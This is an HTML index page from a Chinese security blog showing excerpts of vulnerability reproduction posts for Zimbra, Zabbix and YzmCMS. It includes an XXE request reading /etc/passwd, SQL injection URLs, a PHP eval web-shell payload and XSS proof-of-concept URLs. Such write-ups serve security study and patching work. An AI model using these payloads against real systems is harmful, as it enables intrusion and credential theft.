@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/16/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Zimbra/（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.956Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-9621）（CVE-2019-9670）Zimbra-远程代码执行漏洞"><a href="#（CVE-2019-9621）（CVE-2019-9670）Zimbra-远程代码执行漏洞" class="headerlink" title="（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞"></a>（CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>当 Zimbra<br>存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取<br>localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071<br>admin 端口进行 SOAP AuthRequest 认证，得到 admin<br>authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken<br>后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：</p>
+<ul>
+<li>Zimbra &lt; 8.7.11<br>  版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</li>
+<li>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached<br>  做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="第一步：检测是否存在xxe漏洞"><a href="#第一步：检测是否存在xxe漏洞" class="headerlink" title="第一步：检测是否存在xxe漏洞"></a>第一步：检测是否存在xxe漏洞</h3><pre><code>POST /Autodiscover/Autodiscover.xml HTTP/1.1  
+Host: www.0-sec.org  
+User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0  
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
+Accept-Encoding: gzip, deflate  
+Referer: https://mail.****.com/zimbra/  
+Content-Type: application/soap+xml  
+Content-Length: 436  
+Connection: close  
+Cookie: ZM_TEST=true  
+Upgrade-Insecure-Requests: 1  
+
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+ &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;
+    &lt;Request&gt;
+      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
+      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;
+    &lt;/Request&gt;
+  &lt;/Autodiscover&gt;
+</code></pre>
+<p><img src="/resource/(CVE-2019-9621)(CVE-2019-9670)Zimbra%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Zimbra/%EF%BC%88CVE-2019-9621%EF%BC%89%EF%BC%88CVE-2019-9670%EF%BC%89Zimbra%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8w00nzy8v1aj8ogujo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Zabbix/（CVE-2016-10134）Zabbix latest.php sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Zabbix/%EF%BC%88CVE-2016-10134%EF%BC%89Zabbix%20latest.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.930Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-10134）Zabbix-latest-php-sql注入漏洞"><a href="#（CVE-2016-10134）Zabbix-latest-php-sql注入漏洞" class="headerlink" title="（CVE-2016-10134）Zabbix latest.php sql注入漏洞"></a>（CVE-2016-10134）Zabbix latest.php sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Zabbix2.2.14之前的版本和3.0.4之前的3.0版本中存在SQL注入漏洞。远程攻击者可借助<code>latest.php</code>文件中的<code>toggle_ids</code>数组参数利用该漏洞执行任意SQL命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Zabbix2.2.14之前的版本和3.0.4之前的3.0版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>http://www.0-sec.org:8080</code>，用账号<code>guest</code>（密码为空）登录游客账户。</p>
+<p>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符：</p>
+<p><img src="/resource/(CVE-2016-10134)Zabbixlatest.phpsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>将这16个字符作为sid的值，访问<code>http://www.0-sec.org:8080/latest.php?output=ajax&amp;sid=055e1ffa36164a58&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</code>，可见成功注入：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Zabbix/%EF%BC%88CVE-2016-10134%EF%BC%89Zabbix%20latest.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Zabbix/%EF%BC%88CVE-2016-10134%EF%BC%89Zabbix%20latest.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8x00o0y8v16soo485z" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-8756%EF%BC%89YzmCMS%20v3.7.1%20Eval%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.766Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-8756）YzmCMS-v3-7-1-Eval注入漏洞"><a href="#（CVE-2018-8756）YzmCMS-v3-7-1-Eval注入漏洞" class="headerlink" title="（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞"></a>（CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS<br>3.7.1版本中的yzmphp/core/function/global.func.php文件存在安全漏洞。远程攻击者可借助index.php?m=member&amp;c=member_content&amp;a=init请求的POST数据中的PHP代码利用该漏洞执行任意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS v3.7.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先，从网站后台登陆，/index.php?m=admin&amp;c=index&amp;a=init，然后选择模型管理，选<br>择模型 ID 为 1 的那个字段管理，然后添加字段，像下面这张图一样填表。</p>
+<p><img src="/resource/(CVE-2018-8756)YzmCMSv3.7.1Eval%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>接着需要拦截数据包，像图片一样，</p>
+<pre><code>修改 fieldtype 为 datetime，修改 datesest 为 array(1);@eval($_POST[wushuang])
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-8756%EF%BC%89YzmCMS%20v3.7.1%20Eval%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-8756%EF%BC%89YzmCMS%20v3.7.1%20Eval%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8w00nxy8v1f3eba4vj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/（CVE-2018-7653）YzmCMS v3.6 xss漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-7653%EF%BC%89YzmCMS%20v3.6%20xss%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.764Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-7653）YzmCMS-v3-6-xss漏洞"><a href="#（CVE-2018-7653）YzmCMS-v3-6-xss漏洞" class="headerlink" title="（CVE-2018-7653）YzmCMS v3.6 xss漏洞"></a>（CVE-2018-7653）YzmCMS v3.6 xss漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS<br>3.6版本中存在跨站脚本漏洞。远程攻击者可借助’a’、’c’或’m’参数利用该漏洞注入任意的Web脚本或HTML。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS v3.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>http://www.0-sec.org/YzmCMS/index.php?m=search&amp;c=index&amp;a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&amp;modelid=1&amp;q=tes 
+
+http://www.0-sec.org/YzmCMS/index.php?m=search&amp;c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&amp;a=init&amp;modelid=1&amp;q=tes 
+
+http://www.0-sec.org/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&amp;c=index&amp;a=init&amp;modelid=1&amp;q=tes 
+
+http://www.0-sec.org/YzmCMS/index.php?m=search&amp;c=index&amp;a=init&amp;modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&amp;q=tes
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/vul/id/1124944">https://www.anquanke.com/vul/id/1124944</a></p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-7653%EF%BC%89YzmCMS%20v3.6%20xss%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-7653%EF%BC%89YzmCMS%20v3.6%20xss%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8w00nyy8v1e2qhfnzm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/（CVE-2018-19092）YzmCMS v5.2 xss漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-19092%EF%BC%89YzmCMS%20v5.2%20xss%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.761Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-19092）YzmCMS-v5-2-xss漏洞"><a href="#（CVE-2018-19092）YzmCMS-v5-2-xss漏洞" class="headerlink" title="（CVE-2018-19092）YzmCMS v5.2 xss漏洞"></a>（CVE-2018-19092）YzmCMS v5.2 xss漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html">http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html</a></p>
+<p>XSS payload:<br><a target="_blank" rel="noopener" href="http://192.168.1.40/search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3Ealert(1)%3C/script%3Er6qt2=1">http://www.0-sec.org/search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1</a></p>
+<p>POC:</p>
+<pre><code>GET /search/index/archives/pubtime/1526387722/page/1.html?tqh3l%22%3e%3cscript%3ealert(1)%3c%2fscript%3er6qt2=1 HTTP/1.1
+Host: www.0-sec.org
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://192.168.1.40/search/index/archives/pubtime/1526387722.html
+Cookie: PHPSESSID=u0bh5qnr84qsu9aa0oj8vpkuk
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-19092%EF%BC%89YzmCMS%20v5.2%20xss%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/%EF%BC%88CVE-2018-19092%EF%BC%89YzmCMS%20v5.2%20xss%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qz8v00nvy8v12ap53jeb" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/YzmCMS V5.7 用户模块时间盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.7%20%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.759Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-V5-7-用户模块时间盲注"><a href="#YzmCMS-V5-7-用户模块时间盲注" class="headerlink" title="YzmCMS V5.7 用户模块时间盲注"></a>YzmCMS V5.7 用户模块时间盲注</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS V5.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><code>application/member/controller/order.class.php</code>:76行</p>
+<p>这里直接拼接了where条件，type这里就有问题</p>
+<p><img src="/resource/YzmCMSV5.7%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/media/rId24.png" alt="1.png"></p>
+<p>构造url</p>
+<pre><code>http://www.0-sec.org/member/order/order_search.html?of=id&amp;or=DESC&amp;dosubmit=1&amp;&amp;t_type=sleep(1)
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.7%20%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20V5.7%20%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cl5c2qz8v00nwy8v160mm2yih" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/YzmCMS V5.4 后台getshell（二）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.756Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-V5-4-后台getshell（二）"><a href="#YzmCMS-V5-4-后台getshell（二）" class="headerlink" title="YzmCMS V5.4 后台getshell（二）"></a>YzmCMS V5.4 后台getshell（二）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS V5.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个cms中有一些配置项是写在文件中，也有一些是写在数据库中的，例如上一个漏洞提到的<code>mode</code>就是写在文件中，而我们的payload是写在数据库中再进行读取的，为了避免上面手动修改配置文件这一过程，我找到了一个函数可以修改配置文件，但是问题是只能对规定的4个key进行修改，所以是不能直接修改<code>mode</code>这个key的。于是我回去查看补丁，发现修改配置的函数也进行了修改。</p>
+<p><img src="/resource/YzmCMSV5.4%E5%90%8E%E5%8F%B0getshell(%E4%BA%8C)/media/rId25.png"></p>
+<p>该函数位于文件<code>application/admin/common/function/function.php</code></p>
+<pre><code>function set_config($config) &#123;
+    $configfile = YZMPHP_PATH.&#39;common&#39;.DIRECTORY_SEPARATOR.&#39;config/config.php&#39;;
+    if(!is_writable($configfile)) showmsg(&#39;Please chmod &#39;.$configfile.&#39; to 0777 !&#39;, &#39;stop&#39;);
+    $pattern = $replacement = array();
+    foreach($config as $k=&gt;$v) &#123;
+        $pattern[$k] = &quot;/&#39;&quot;.$k.&quot;&#39;\s*=&gt;\s*([&#39;]?)[^&#39;]*([&#39;]?)(\s*),/is&quot;;
+        $replacement[$k] = &quot;&#39;&quot;.$k.&quot;&#39; =&gt; \$&#123;1&#125;&quot;.$v.&quot;\$&#123;2&#125;\$&#123;3&#125;,&quot;;                    
+    &#125;
+    $str = file_get_contents($configfile);
+    $str = preg_replace($pattern, $replacement, $str);
+    return file_put_contents($configfile, $str, LOCK_EX);       
+&#125;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="cl5c2qz8t00nuy8v1fbtr2dmu" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/YzmCMS V5.4 后台getshell（一） " class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%B8%80%EF%BC%89%20/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.754Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-V5-4-后台getshell（一）"><a href="#YzmCMS-V5-4-后台getshell（一）" class="headerlink" title="YzmCMS V5.4 后台getshell（一）"></a>YzmCMS V5.4 后台getshell（一）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS V5.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>发现的第一个问题出现在缓存文件写入函数处，文件为<code>yzmphp/core/class/cache_file.class.php</code>，函数名为<code>_fileputcontents</code></p>
+<p><img src="/resource/YzmCMSV5.4%E5%90%8E%E5%8F%B0getshell(%E4%B8%80)/media/rId25.png"></p>
+<p>可以看到，补丁在原先的<code>$contents</code>前拼接了一段<code>\n</code>，而如果要进入序列化的代码，需要<code>$this-&gt;config[&#39;mode&#39;]</code>为1，然后就是正常的写入文件。</p>
+<p>调用这个函数的是同类下的<code>set</code>函数</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%B8%80%EF%BC%89%20/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20V5.4%20%E5%90%8E%E5%8F%B0getshell%EF%BC%88%E4%B8%80%EF%BC%89%20/" data-id="cl5c2qz8t00nty8v13v0c3uwe" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-YzmCMS/YzmCMS V5.3 后台ssrf " class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.3%20%E5%90%8E%E5%8F%B0ssrf%20/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.751Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-V5-3-后台ssrf"><a href="#YzmCMS-V5-3-后台ssrf" class="headerlink" title="YzmCMS V5.3 后台ssrf"></a>YzmCMS V5.3 后台ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS V5.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞位于<br>application\collection\controller\collection_content.class.php 中的<br>collection_test<br>函数，此函数为获取一个网页中的URL，并获取此URL的值输出。类似于爬虫，爬取网页中URL对应的文章。以下为主要功能函数：　</p>
+<p><img src="/resource/YzmCMSV5.3%E5%90%8E%E5%8F%B0ssrf/media/rId25.png"></p>
+<p>首先查看 get_content()函数：</p>
+<p><img src="/resource/YzmCMSV5.3%E5%90%8E%E5%8F%B0ssrf/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/YzmCMS%20V5.3%20%E5%90%8E%E5%8F%B0ssrf%20/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20V5.3%20%E5%90%8E%E5%8F%B0ssrf%20/" data-id="cl5c2qz8s00nsy8v1al30a7pe" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
